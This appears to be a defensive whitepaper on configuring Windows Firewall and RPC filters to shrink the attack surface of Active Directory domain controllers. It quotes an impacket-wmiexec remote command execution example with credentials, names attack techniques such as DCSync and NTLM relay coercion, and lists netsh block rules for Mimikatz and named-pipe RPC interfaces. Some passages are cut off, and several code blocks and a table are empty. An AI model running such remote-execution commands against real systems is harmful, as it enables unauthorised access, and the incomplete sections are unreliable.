## Summary

Windows Firewall with Advanced Security can sometimes be tricky to configure securely.
As a consequence, it is usually disabled or left open for all traffic in many organizations.
The *Domain Controller Firewall* project therefore aims to simplify the deployment of a specific set of firewall rules
and RPC filters that can significantly reduce the attack surface of Domain Controllers (DCs),
without impacting the functionality of Active Directory (AD).

![Windows Firewall with Advanced Security](../Images/Screenshots/dc-firewall.png)

The purpose of this whitepaper is to serve as a comprehensive source of Windows Firewall-related information.
It includes detailed information about Windows Firewall configuration options, network protocols,
configuration caveats, and network-based attacks. Most importantly, it provides guidance on configuring
Windows Firewall with Advanced Security in enterprise environments to make them more secure.

To streamline the host-based firewall configuration process, we have also created the `DCFWTool` as part of this project.
This PowerShell-based tool provides a flexible and repeatable way
of deploying a secure DC firewall configuration within minutes.
The functionality and configuration options of the `DCFWTool` are described in this document as well.

## Secure Firewall Policy Design

### Overview

There are many decisions one needs to make when designing a firewall policy for domain controllers.
This chapter contains general recommendations on Windows Firewall configuration, including the reasoning behind them.

When creating your own DC firewall policy, you do not need to start from scratch. Instead, you can use the `DCFWTool`,
which will generate a GPO that implements all these recommendations.

### Host-Based Firewall vs Network-Based Firewall

Most network administrators only configure network-based firewalls and turn off
the [Windows Firewall](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/)
on servers. They reason is that they do not want to maintain duplicate sets of firewall rules
and that Windows Firewall rule management is cumbersome and inflexible.

![The most common DC firewall configuration](../Images/Screenshots/firewall-off.png)

There are several security issues with this approach:

- As network-based firewalls only filter traffic between networks, they are incapable of blocking lateral movement
  inside of VLANs. Their functionality might further be degraded by poor network segmentation.
- The majority of network firewalls are incapable of differentiating between various RPC-based protocols,
  most of which use dynamic port numbers. Thus, the entire ephemeral TCP port range (49152-65535) is typically accessible
  on domain controllers from the entire corporate network, regardless of whether a particular port is used
  by the Netlogon service or for remote management of scheduled tasks.
- Network-based firewalls are commonly managed by dedicated teams that might lack the required advanced Windows knowledge.

![RPC over named pipes traffic with SMBv3 encryption](../Images/Screenshots/wireshark-smb3.png)

The best practice is thus to configure both the network-based firewall and host-based firewall. Internet traffic should
additionally be filtered by proxy servers.

This whitepaper only focuses on the secure configuration of host-based firewalls, i.e., Windows Defender Firewall
with Advanced Security, on domain controllers. However, the [Inbound Firewall Rules Reference](#inbound-firewall-rules-reference)
chapter might also serve as an information source for configuring network-based firewalls.

### Need for Scripting

As the Windows Firewall does not provide the ability to create named IP address sets, e.g., Management VLANs,
manual (re)configuration of firewall rules and their source IP address ranges is cumbersome and error-prone.
We have additionally noticed that port numbers are sometimes mangled while copying firewall rules between policy objects.
It is therefore strongly recommended that PowerShell scripts be used manage Windows Firewall rules,
which is what the `DCFWTool` does.

### Static IP Addresses

Domain controllers should be configured with **static IP addresses**, as recommended by Microsoft.
Failure to do so might cause network outages and would further complicate the firewall configuration.
The firewall rule set described in this document therefore does not cover the DHCP client traffic.

### Firewall Rule Merging

To ensure the domain controllers are configured consistently,
their host-based firewalls should be managed centrally through a GPO.
Any **local settings on individual DCs should be ignored** during firewall rule evaluation.

This whitepaper and the policy object created by the `DCFWTool` only cover traffic related to domain controllers
and a few additional Windows Server roles often present on DCs.
If additional environment-specific firewall rules are needed (DC agents, SCCM management, etc.),
it is recommended to define them in separate GPOs.
The resulting firewall rule set, which will be honored by the DCs, will contain rules from all GPOs applied to these DCs.

> [!NOTE]
> Please keep in mind that this whitepaper only focuses on the firewall configuration
> and does not cover any other aspects of domain controller security hardening.
> You should have a separate and dedicated security baseline GPO applied to your DCs.

![GPO precedence](../Images/Screenshots/firewall-precedence-gpo.png)

### Identifying Management Traffic

#### Motivation

Any proper DC firewall rule design requires that administrators are able to define the following groups of IP addresses
or network ranges:

- **Client network** (servers and client computers)
- **Management network** (endpoints used for Tier 0 administration)
- **Domain Controller network** (all DCs in the forest)

Ideally, protocols that could be (mis)used for remote command execution, should only be open from the management network(s).
Similarly, replication traffic should only be allowed to originate from other domain controllers.
However, not all network protocols can be categorized easily.

#### The Good

With some protocols, it is quite obvious that they should only be available from management networks or jump servers.
This is the case with the **[Remote Desktop Protocol (RDP)](#remote-desktop---user-mode-udp-in)**
or **[Remote Event Log Management](#remote-event-log-management-rpc)**.

#### The Bad

Several protocols should primarily be used for remote system management,
but some organizations also use them for client traffic.

One such example is the **[Windows Remote Management (WinRM)](#windows-remote-management-http-in)** protocol.
Contrary to its name, it can not only be used
by [Server Manager](https://learn.microsoft.com/en-us/windows-server/administration/server-manager/server-manager)
and [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting),
but also by source-initiated [Windows Event Collector](https://learn.microsoft.com/en-us/windows/win32/wec/windows-event-collector)
subscriptions.
As a best practice, domain controllers should not be used as event forwarding targets, especially not by workstations.
AD domains, where this recommendation is not followed, must first be reconfigured before the strict firewall rules
are applied to domain controllers.

Another example would be **[Active Directory Web Services (ADWS)](#active-directory-web-services-tcp-in)**. It is rare,
but not unimaginable, to see legitimate PowerShell scripts with the `Get-ADUser` cmdlet running on client machines.
Such scripts would stop working if ADWS is simply blocked on domain controllers.
On the other hand, it is relatively easy to rewrite these scripts to use the built-in
[DirectorySearcher](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher) class,
which relies on the [LDAP](#active-directory-domain-controller---ldap-udp-in) protocol instead of ADWS.
The added value would be the removal of the [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/)
PowerShell module dependency.

If an organization still uses the standalone [Managed Service Accounts (MSAs)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009),
application servers need ADWS connectivity for MSA enrollment using
the [Install-ADServiceAccount](https://learn.microsoft.com/en-us/powershell/module/activedirectory/install-adserviceaccount)
PowerShell cmdlet. Migration to [Group Managed Service Accounts (gMSAs)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview),
which do not depend on this cmdlet, is highly recommended.

#### The Ugly

Unfortunately, there are some protocols that are required by all Windows clients, but can also be (mis)used
to perform administrative operations.

One would be highly tempted to limit the **[Directory Replication Service (DRS) Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47)**
traffic to domain controllers and thus block potential [DCSync](https://adsecurity.org/?p=1729) attacks.
Unfortunately, this protocol is also used by Windows clients during user logon,
specifically its [IDL_DRSCrackNames](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/9b4bfb44-6656-4404-bcc8-dc88111658b3)
RPC call, so it cannot simply be blocked by an L3 firewall rule.
One solution to this problem would be the deployment of the open-source [RPC Firewall](https://github.com/zeronetworks/rpcfirewall)
tool, which can selectively limit the scope of the dangerous
[IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894)
operation. However, the project does not seem to be mature enough for production deployments.
Its installation and configuration are cumbersome and require deep understanding of the RPC protocol.
Moreover, the binaries are not digitally signed, making them incompatible with some optional Windows security features,
including [LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection).
As a result, the most common approach is to just monitor domain controllers for unexpected replication traffic.
Many products in the Identity Threat Detection and Response (ITDR) category are able to detect the DCSync attack,
including [Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/what-is)
and [Netwrix Threat Manager](https://www.netwrix.com/threat_detection_software.html).

The protocol that causes the most confusion among network administrators is undeniably the **[Server Message Block (SMB)](#active-directory-domain-controller---samlsa-np-udp-in)**.
Although its primary use is for file and printer sharing, it can also be used for remote
system management through various RPC-based protocols. Because the functionality of AD heavily
depends on the `SYSVOL` and `NETLOGON` file shares on domain controllers, the SMB protocol
cannot simply be blocked on DCs. Deep packet inspection has also become less effective
with the advent of SMBv3 encryption. Our approach to this issue is
to [selectively block remote management over SMB named pipes](#rpc-filters).

Also worth mentioning is the **[Lightweight Directory Access Protocol (LDAP)](#active-directory-domain-controller---ldap-udp-in)**,
which gives Active Directory its name. It can surely be used for administrative operations,
e.g., privileged group membership changes, but at least it does not provide the capability to directly
execute arbitrary code on DCs. And with a well-configured SIEM or an ITDR solution,
modifications of sensitive AD objects can be detected in almost real time.

### Firewall Rule Deduplication

Many of the built-in/predefined Windows Firewall rules are actually duplicates of each other, as they open the same ports,
even though their names might suggest otherwise. For example, all of the following rules open
port `135/TCP` for the `rpcss` service:

- RPC Endpoint Mapper (TCP, Incoming)
- Active Directory Domain Controller (RPC-EPMAP)
- Microsoft Key Distribution Service (RPC EPMAP)
- DFS Replication (RPC-EPMAP)
- File Replication (RPC-EPMAP)
- File Server Remote Management (DCOM-In)
- Remote Service Management (RPC-EPMAP)
- Remote Scheduled Tasks Management (RPC-EPMAP)
- Remote Event Log Management (RPC-EPMAP)
- Remote Event Monitor (RPC-EPMAP)
- Remote Volume Management (RPC-EPMAP)
- Windows Defender Firewall Remote Management (RPC-EPMAP)
- Windows Management Instrumentation (DCOM-In)
- DFS Management (DCOM-In)
- COM+ Remote Administration (DCOM-In)
- COM+ Network Access (DCOM-In)
- Performance Logs and Alerts (DCOM-In)

![Duplicate RPC Endpoint Mapper rules](../Images/Screenshots/duplicate-epmap-rules.png)

Similarly, all of these firewall rules open port `445/TCP` for `System`:

- File and Printer Sharing (SMB-In)
- Active Directory Domain Controller - SAM/LSA (NP-TCP-In)
- Netlogon Service (NP-In)
- File Server Remote Management (SMB-In)
- DFS Management (SMB-In)
- Remote Event Log Management (NP-In)
- Remote Service Management (NP-In)

![Duplicate SMB rules](../Images/Screenshots/duplicate-smb-rules.png)

Moreover, both ports 135 and 445 need to be accessible by all Windows clients for Active Directory to function properly.
To keep the configuration readable, it is reasonable to consolidate the redundant rules
and to create a single firewall rule for each static port number.

### Issues with Predefined Address Sets

#### Overview of Keywords

In addition to manually enumerating IP address ranges, the firewall rule scope configuration allows
the use of predefined sets of computers, known as keywords.

![Predefined address sets (keywords) in Windows Firewall](../Images/Screenshots/firewall-predefined-sets.png){ width=300px }

These keywords are briefly described in the [MS-FASP: Firewall and Advanced Security Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fasp/d69ec3fe-8507-4524-bdcc-813cbb3bf85f)
document. However, no public documentation is available that explains how the keywords are defined and under
what circumstances the corresponding IP addresses are updated.

#### Intranet

The *Intranet* keyword is based on the Subnet definition from Active Directory Sites and Services.
However, our tests have shown that the corresponding firewall rule scopes are not re-evaluated after adding
or deleting a subnet. Even multiple server reboots do not seem to resolve this issue.
Due to this unreliability, we have decided not to use the *Intranet* keyword in any firewall rules.

![Subnets - The source for the Intranet keyword](../Images/Screenshots/firewall-keyword-intranet.png)

#### Internet

The *Internet* keyword is presumed to include anything not defined as the *Intranet* keyword.
However, due to the unpredictable and undocumented behavior of the *Intranet* keyword,
we have decided not to use the *Internet* keyword in any firewall rules as well.

#### DNS Servers

The *DNS Servers* keyword is functional and respects all DNS servers defined in the network adapter properties.
If a new DNS server IP address is configured, a network adapter state change (disable/enable, server restart, etc.)
is required for the corresponding firewall rules to be automatically updated.

![Network adapter DNS configuration](../Images/Screenshots/firewall-keyword-dns.png){ width=400px }

#### Additional Keywords

Additional keywords are available and although they seem to be mostly working,
they are not relevant to inbound firewall rule configuration for Domain Controller:

- Local subnet
- DHCP servers
- WINS servers
- Default gateway
- Remote Corp Network
- PlayTo Renderers
- Captive Portal Addresses

### Avoiding Localized Rule Names

All of the built-in firewall rules are localized and displayed based on the OS language.
However, this feature relies on RSAT being installed on the management computer.
If RSAT is absent, the UI may show references to missing DLL files instead of the actual firewall rule display names.

![Localized rule names not displayed correctly](../Images/Screenshots/localization-issue.png){ width=300px }

To ensure consistent firewall rule name display regardless of RSAT or the OS locale,
all rule names should be hardcoded in the PowerShell script creating them.

### Firewall Profiles

Windows Firewall differentiates between three network profiles that can be targeted by firewall rules:

- The **Domain** profile applies to networks where the host system can authenticate to a domain controller.
- The **Private** profile is used to designate private or home networks.
- The **Public** profile is used to designate public networks
  such as Wi-Fi hotspots at coffee shops, airports, and other locations.

Network interfaces of Domain Controllers and other computers on corporate networks
are automatically assigned the Domain profile.
However, the assignment of this profile depends on the Microsoft Windows Network Location Awareness (NLA) functioning properly.
Under specific circumstances, usually during recovery scenarios or complete power outages,
NLA can improperly detect the network type during the system startup and thus activate a wrong firewall profile.

It is therefore highly recommended to configure all firewall rules on DCs to target all 3 network profiles,
to avoid potential loss of network connectivity.

![Windows Firewall profiles](../Images/Screenshots/firewall-profiles.png){ width=400px }

### Infeasibility of Outbound Traffic Filtering

#### Reasons for Blocking Outbound Traffic

Generally speaking, outbound firewall rules on domain controllers might play an important role in blocking NTLM relay
through workstations, preventing lateral movement, breaking malware C2 channels, and mitigating the risk of data breaches.

On the other hand, all of the [security standards we are familiar with](#security-standards-compliance) state
that Windows Firewall should allow outbound connections by default.
The [CIS benchmark](#center-for-internet-security-cis-benchmark) provides this rationale:

> Some people believe that it is prudent to block all outbound connections except those specifically approved
> by the user or administrator. Microsoft disagrees with this opinion, blocking outbound connections by default will
> force users to deal with a large number of dialog boxes prompting them to authorize or block applications
> such as their web browser or instant messaging software. Additionally, blocking outbound traffic
> has little value because if an attacker has compromised the system they can reconfigure the firewall anyway.

Furthermore, our security research has shown that configuring a reliable allow list for outbound traffic
using the built-in features of Windows is impractical. We have identified several challenges that make
it difficult to implement such a list.

#### Services with User Impersonation

The following important Windows services initiate outbound connections, yet they locally impersonate the currently
logged-on user, making it impossible to target them in service-specific Windows Firewall rules:

- Windows Update (wuauserv)
- Cryptographic Services (CryptSvc)
- Background Intelligent Transfer Service (BITS)

This means that in order to keep Windows Update working, one would need to target the `svchost.exe` program
in a firewall rule, thus allowing all services to connect to remote computers.

#### Scheduled Tasks with Custom Handlers

Some scheduled task actions are implemented using a custom DLL handler. As a result, the corresponding firewall
rule would need to target the `taskhostw.exe` program, thus allowing all scheduled tasks to connect to remote computers.

![Scheduled task with a custom handler](../Images/Screenshots/scheduled-task-custom-handler.png)

#### Microsoft Defender for Identity

The [Network Name Resolution](https://learn.microsoft.com/en-us/defender-for-identity/nnr-policy)
and [Lateral Movement Path Detection](https://learn.microsoft.com/en-us/defender-for-identity/deploy/remote-calls-sam)
capabilities of Microsoft Defender for Identity depend on the domain controllers being able to connect
over the RDP (TCP port 3389), RPC (TCP port 135), NetBIOS (UDP port 137), and SMB (TCP port 445) protocols
to all workstations. It would thus be impossible to fully mitigate NTLM relay attacks against domain controllers
using outbound firewall rules in environments with this product deployed. Moreover, the sensor needs to be able
to communicate with Microsoft's servers as well.

#### Azure Arc

Large organizations might want to utilize the new hotpatching capability of Windows Server 2025.
However, this feature is only available on servers managed by [Azure Arc](https://azure.microsoft.com/en-us/products/azure-arc).
And the Azure Arc Agent contains several binaries and PowerShell scripts,
which all need to be able to communicate with Microsoft's cloud,
but their exact behavior is undocumented and subject to change.

![Azure Arc Agent binaries and PowerShell scripts](../Images/Screenshots/azure-arc-binaries.png){ width=400px }

Interestingly, the Azure Arc installer creates a custom outbound firewall rule called `SmeOutboundOpenException`,
which targets all processes and is scoped to a hardcoded list of Microsoft's IP addresses.
It is unclear how reliable and future-proof this rule actually is,
as even [Google has never heard of it](https://www.google.com/search?q=SmeOutboundOpenException).

![Azure Arc built-in outbound firewall rule](../Images/Screenshots/azure-arc-firewall.png){ width=400px }

#### Installers Downloading Additional Files

Many application installers (`setup.exe` or `setup.msi`) do not work in a fully offline mode,
as they need to download some prerequisites from the Internet.
Microsoft .NET Framework and Visual C++ Runtime seem to be the most common installer dependencies.
Then there are so-called web installers, which download all application binaries from online sources.
As installers do not have well-defined names and can be executed from any location,
it is impossible to selectively cover them by a firewall rule.

#### Dynamic Keywords

Windows Firewall includes a functionality called [dynamic keywords](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/dynamic-keywords),
which simplifies the management of Windows Firewall.
This feature allows administrators to define the following types of keywords,
which can then be referenced by firewall rules:

- Set of IP address ranges
- Fully qualified domain names (FQDNs)
- Autoresolution options

As the dynamic keywords cannot be referenced in firewall rules managed by Group Policies,
we have decided not to use them in our configuration.

#### WinHTTP Proxy

After we verified that it was indeed impossible to selectively filter outbound Internet traffic on domain controllers
using Windows Firewall in a reliable way, we turned our attention
to the built-in [WinHTTP proxy](https://learn.microsoft.com/en-us/windows/win32/winhttp/netsh-exe-commands#set-advproxy).
The idea was to compile a list of all cloud endpoints used by Windows Server components
and to configure the local WinHTTP proxy to only allow outbound HTTP(S) connections to these endpoints
while acting as a black hole for any other outbound traffic.

![Listing the advanced WinHTTP proxy configuration](../Images/Screenshots/proxy-config.png)

Although this approach seemed promising initially, we soon stumbled upon a few difficulties:
The advanced WinHTTP proxy settings lack proper documentation and the ever-changing list
of Microsoft's cloud services used by Windows Server turned out to be too large for us to maintain.
And when the `netsh.exe winhttp reset autoproxy` stopped working repeatedly
and manual registry cleanup was necessary to fix this issue,
we definitely abandoned the idea of using WinHTTP proxy on domain controllers.

![WinHTTP proxy configuration error](../Images/Screenshots/proxy-error.png)

#### Escaping the Rabbit Hole

As a conclusion, the only viable and secure solution is to deploy 3rd-party Internet proxy servers
that would limit the outbound traffic from domain controllers to select FQDNs.
This list of approved addresses used by Microsoft's services should ideally be kept up-to-date by the proxy vendor.

Some Windows Server components that generate non-essential outbound Internet traffic can easily be turned off.
For example, many enterprises choose to turn off [telemetry](https://learn.microsoft.com/en-us/windows/privacy/configure-windows-diagnostic-data-in-your-organization)
and [P2P delivery of Windows updates](https://learn.microsoft.com/en-us/windows/deployment/do/waas-delivery-optimization).

To at least block outbound traffic to known malicious IP addresses and URLs directly on the host,
it is recommended to turn on the [Network protection](https://learn.microsoft.com/en-us/defender-endpoint/network-protection)
feature of the built-in Microsoft Defender Antivirus.
Thus far, we have not noticed any adverse effects of enabling this functionality on domain controllers.

And then there are of course air-gapped (isolated) environments,
in which the growing number of cloud-dependent Windows Server features will never be used,
thus eliminating the need to differentiate between legitimate and potentially malicious Internet traffic.

### Static RPC Ports

Several Windows services that use RPC dynamic ports by default can be configured to listen on static port numbers instead.
This allows for easier tracing and troubleshooting at the network level
and simplifies rule configuration for network-based firewalls.

Static endpoints of some protocols can be set by modifying the registry.
This is the case with the **Active Directory (NTDS)** service:

> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters  
> Value name: TCP/IP Port  
> Value type: REG_DWORD  
> Value data: (available port)

The related **Netlogon** service needs to be configured separately:

> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters  
> Value name: DCTcpipPort  
> Value type: REG_DWORD  
> Value data: (available port)

A static TCP port can be configured for the legacy **File Replication Service (FRS)** through the registry as well:

> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTFRS\\Parameters  
> Value name: RPC TCP/IP Port Assignment  
> Value type: REG_DWORD  
> Value data: (available port)

To simplify the deployment of the registry settings above,
the custom [DomainControllerFirewall.admx](#administrative-templates) template
has been created as part of this project.

Additional static RPC ports can be set using built-in command line tools,
most importantly for the **Distributed File System Replication (DFSR)**:

```shell
dfsrdiag.exe StaticRPC /Port:<available port>
```

We recommend using port 5722, which was allocated for DFSR in Windows Server 2008 and Windows Server 2008 R2,
before the service was changed to use a random port number in Windows Server 2012.
As the `dfsrdiag` tool is not available on DCs by default,
it must first be installed using the following command:

```shell
dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
```

The **Windows Management Instrumentation (WMI)** protocol can also be configured
to use a static TCP port. The next command will move the WMI service
to a standalone process listening on TCP port 24158,
with the authentication level set to [RPC_C_AUTHN_LEVEL_PKT_PRIVACY](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/425a7c53-c33a-4868-8e5b-2a850d40dc73):

```shell
winmgmt.exe /standalonehost 6
```

In order to maintain uniform configuration across all domain controllers,
these commands are recommended to be executed from startup scripts targeting DCs.

Here is a mnemotechnical example of a static RPC port configuration:

| Service  |         Port |
|----------|-------------:|
| NTDS     |    38901/TCP |
| Netlogon |    38902/TCP |
| FRS      |    38903/TCP |
| DFSR     |     5722/TCP |
| WMI      |    24158/TCP |

### RPC Filters

#### RPC over Named Pipes

Most RPC protocols implemented in Windows support two transport types:

- [RPC over TCP/IP (ncacn_ip_tcp)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/95fbfb56-d67a-47df-900c-e263d6031f22)
- [RPC over SMB Named Pipes (ncacn_np)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/7063c7bd-b48b-42e7-9154-3c2ec4113c0d)

Each Windows service that uses the TCP/IP transport is assigned its own RPC dynamic port and in some cases,
[static ports can be configured](#static-rpc-ports). Windows Firewall rules can then target services
by their identifiers or program paths and either allow or block service-specific inbound traffic.
It is thus possible to only allow remote management traffic from specific IP addresses.

The named pipes transport is more problematic, as standard Windows Firewall rules
can only allow or block all SMB traffic (`445/TCP`)
and Active Directory functionality heavily depends on the `SYSVOL` and `NETLOGON` file shares
being available over the SMB protocol to all Windows clients.
The SMB protocol is therefore very popular among malicious actors
and many off-the-shelf hacktools exclusively use the named pipes to perform remote code execution
and other undesirable operations.

Fortunately, it is possible to use the RPC Filters, a lesser-known feature of the Windows Firewall,
to partially limit undesirable RPC traffic. There is no graphical user interface for RPC Filters,
but a subset of their capabilities can be configured using the `netsh.exe` tool.
Each RPC protocol must be dealt with individually.

is to disable the `Print Spooler` service on domain controllers.
As an alternative, the following sequence of `netsh.exe` commands will block MS-RPRN connections over named pipes:

```txt
rpc filter
add rule layer=um actiontype=block filterkey=7966512a-f2f4-4cb1-812d-d967ab83d28a
add condition field=protocol matchtype=equal data=ncacn_np
add condition field=if_uuid matchtype=equal data=12345678-1234-ABCD-EF00-0123456789AB
add filter
```

> [!NOTE]
> In a future version of Windows Server, the MS-RPRN protocol will exclusively
be [moved to a standalone TCP port](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
by default.

#### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol

The [\[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
is [available over multiple named pipes](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/1baaad2f-7a84-4238-b113-f32827a39cd2):

| Named Pipe     | RPC Interface UUID                   |

| \\PIPE\\lsarpc | c681d488-d850-11d0-8c52-00c04fd90f7e |

This protocol is yet another popular target for initiating NTLM relay attacks:

```shell

```

In environments where EFS is not used, the MS-EFSR protocol could be disabled entirely.
A more compatible approach would be to enforce Kerberos authentication
and packet encryption on MS-EFSR connections. Although this solution is not bulletproof,
it works against most hacktools. Here is the corresponding sequence of `netsh.exe` commands:

```txt

```

#### \[MS-FSRVP\]: File Server Remote VSS Protocol

The [\[MS-FSRVP\]: File Server Remote VSS Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
with UUID [a8e0653c-2744-4389-a61d-7373df8b2292](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/92d20000-dcbc-4ec1-bf10-9a38c828436d)
is exposed by the **File Server VSS Agent Service** optional feature over the [\\PIPE\\FssagentRpc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/c504c88e-3248-418f-8d83-22ec8f008816)
named pipe.

In the past, this protocol could have been abused by the [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) attack,
but Microsoft fixed the corresponding vulnerability in [KB5015527](https://support.microsoft.com/en-us/topic/kb5015527-shadow-copy-operations-using-vss-on-remote-smb-shares-denied-access-after-installing-windows-update-dated-june-14-2022-6d460245-08b6-40f4-9ded-dd030b27850b).
No further action is therefore needed.

#### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol

The [\[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a)
with UUID [50ABC2A4-574D-40B3-9D66-EE4FD5FBA076](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/5093503c-687e-4376-9127-50504908fb91)
is used by the built-in `dnsmgmt.msc` console and the `dnscmd.exe` utility to remotely manage DNS servers:

```shell
dnscmd.exe dc01 /EnumZones /Primary /Forward
```

```txt
Enumerated zone list:
        Zone count = 3

 Zone name                      Type       Storage         Properties

```

The [ServerLevelPluginDll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef)
operation of the `MS-DNSP` protocol can be misused to remotely execute code on domain controllers,
which makes this protocol interesting from the attacker's perspective.
Although the built-in Windows tools only use the TCP/IP transport,
the protocol is exposed over the `\PIPE\DNSSERVER` named pipe as well.
The latter transport layer could be blocked by executing the following sequence of `netsh.exe` commands:

```txt
rpc filter
add rule layer=um actiontype=block filterkey=50754fe4-aa2d-42ff-8196-e90ea8fd2527
add condition field=protocol matchtype=equal data=ncacn_np
add condition field=if_uuid matchtype=equal data=50abc2a4-574d-40b3-9d66-ee4fd5fba076
add filter
```

#### \[MS-WMI\]: Windows Management Instrumentation Remote Protocol

The [\[MS-WMI\]: Windows Management Instrumentation Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814)
protocol is often used by administrators for remote system administration and monitoring:

```powershell
(Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName dc01 -Property Caption).Caption
```

```txt
Microsoft Windows Server 2022 Standard
```

The protocol is also popular among malicious actors to perform remote command execution:

```shell
impacket-wmiexec 'contoso/Admin:Pa$$w0rd@dc01' hostname
```

```txt
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
DC01
```

Although the output of the tool might suggest that WMI traffic can be tunneled through SMB named pipes as well,
it is fortunately not true and the WMI protocol can effectively be blocked using Windows Firewall.
To further mitigate the threat of remote malicious command execution over WMI,
it is recommended to turn on the following [Microsoft Defender Attack Surface Reduction (ASR)](https://learn.microsoft.com/en-us/defender-endpoint/overview-attack-surface-reduction)
rules:

- [Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference#block-process-creations-originating-from-psexec-and-wmi-commands)
- [Block persistence through WMI event subscription](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference#block-persistence-through-wmi-event-subscription)

> [!IMPORTANT]
> System Center Configuration Manager (SCCM) client and Distribution Point (DP)
> will not work properly if these ASR rules are enabled.

#### Malicious C2 Protocols and Backdoors

Some malicious tools can use the RPC protocol as a Command and Control (C2) channel.
One such example is the infamous `Mimikatz` tool,
which can be remotely controlled through the MimiCom interface with UUID [17FC11E9-C258-4B8D-8D07-2F4125156244](https://github.com/gentilkiwi/mimikatz/blob/master/mimicom.idl).
One could of course block this interface using the following RPC filter:

```txt
rpc filter
add rule layer=um actiontype=block filterkey=644291ca-9530-4066-b654-e7b838ebdc06
add condition field=if_uuid matchtype=equal data=17FC11E9-C258-4B8D-8D07-2F4125156244
add filter
```

Unfortunately, this approach would be futile, as serious adversaries would never use a well-known protocol identifier.

#### Further Protocol Considerations

The following protocols need to be investigated in the future, as they are open to all domain controller clients:

- [\[MS-TSTS\]: Terminal Services Terminal Server Runtime Interface Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/1eb45af1-94f1-4c42-9e13-dd0a018646fd)
- [\[MS-RSP\]: Remote Shutdown Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rsp/6dfeb978-7a02-4826-b537-a1760fbf8074)

  specifically the ShellWindows, ShellBrowserWindow, and MMC20 objects.
- [\[MS-RRP\]: Windows Remote Registry Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78)

### IPSec Rules

IPSec (Internet Protocol Security) provides means to ensure the confidentiality,
integrity, and authenticity of data transmissions.
The deployment of IPSec in transport mode therefore used to be an integral part of enterprise security baselines.
However, this IPSec mode has turned out to be too complex to implement for the majority of organizations.
Moreover, native encryption layers have been added to protocols like SMB, RDP, and RPC,
making IPSec mostly redundant in Windows networks.

One of the few exceptions is the DNS protocol, where not even the DNSSEC extension
makes it immune to man-in-the-middle (MITM) attacks.
And while Windows contains rich configuration options for securing DNS traffic in corporate networks using IPSec,
the industry seems to have chosen DNS over HTTPS (DoH) to protect DNS traffic in public networks instead.
We can only hope for the DoH support in Windows Server and access points with captive portals to improve in the near future
so that DoH can seamlessly be enforced on corporate devices.

As a conclusion, most organizations should not even consider deploying IPSec in transport mode.
They should rather focus on properly configuring the security measures that are already available in application protocols,
but are not enabled by default.

### Name Resolution Protocols

While the Domain Name System (DNS) is the primary protocol used for name resolution in Windows,
the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBNS)
protocols are used as fallback. Support for Multicast DNS (mDNS) has been added in Windows 10.
These 3 peer name resolution protocols are enabled by default and are often abused by malicious actors.
By sending spoofed responses, they are able to redirect network traffic to their devices
and perform MITM attacks against insecure network protocols like SMB or NTLM.
It is therefore strongly recommended to disable the LLMNR, NBNS, and mDNS protocols,
especially on sensitive systems like domain controllers.

Disabling the LLMNR protocol is straightforward, as there is a built-in Group Policy setting available,
located in Computer Configuration → Policies → Administrative Templates
→ Network → DNS Client → **Turn off multicast name resolution**.
